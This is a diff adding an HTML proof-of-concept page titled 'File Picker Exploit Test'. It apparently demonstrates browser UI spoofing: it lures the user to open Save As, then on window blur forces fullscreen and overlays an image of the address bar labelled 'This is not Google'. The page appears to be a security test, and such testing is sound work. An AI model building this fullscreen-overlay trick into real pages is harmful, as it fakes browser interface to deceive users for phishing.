@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html id="id" >
+<head>
+  <meta charset="utf-8">
+  <title>File Picker Exploit Test</title>
+  <body >
+    <style>
+#overlay{
+    position:fixed;
+    inset:0;
+    display:none;
+    z-index:2147483647;
+}
+
+#overlay img{
+    width:100vh;
+    object-fit:cover;
+}
+
+#text{
+    position:absolute;
+    top:40%;
+    left:50%;
+    transform:translateX(-50%);
+
+    color:black;
+    text-align:center;
+    font-family:sans-serif;
+    
+}
+</style>
+</head>
+
+<h2>Get Your Certificate</h2>
+
+<ol>
+  <li>Right-click to open the context menu.</li>
+  <li>Select <b>Save As...</b>.</li>
+</ol>
+<div id="overlay">
+    <img src="omnibox.png" alt="Background">
+
+    <div id="text">
+        <h1>This is not Google</h1>
+        
+    </div>
+</div>
+<pre id="log" style="opacity: 0;"></pre>
+
+<script>
+const logEl = document.getElementById("log");
+
+
+function log(msg) {
+  logEl.textContent += msg + "\n";
+}
+
+let armed = false;
+
+document.getElementById("id").addEventListener("contextmenu", () => {
+  armed = true;
+  log("Armed: resize will trigger file picker");
+});
+
+
+
+const overlay = document.getElementById("overlay");
+
+async function fullscreen() {
+    try {
+        await document.documentElement.requestFullscreen();
+        console.log("fullscreen success");
+        overlay.style.display = "block";
+
+    } catch (e) {
+        console.log("fullscreen failed:", e.name, e.message);
+    }
+}
+
+
+window.addEventListener("blur", async () => {
+  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+  if (!armed) return;
+await sleep(0);
+  armed = false; 
+  log("Blur detected → opening file picker...");
+ fullscreen();
+
+ 
+});
+</script>
+
+</body>
+</html> 
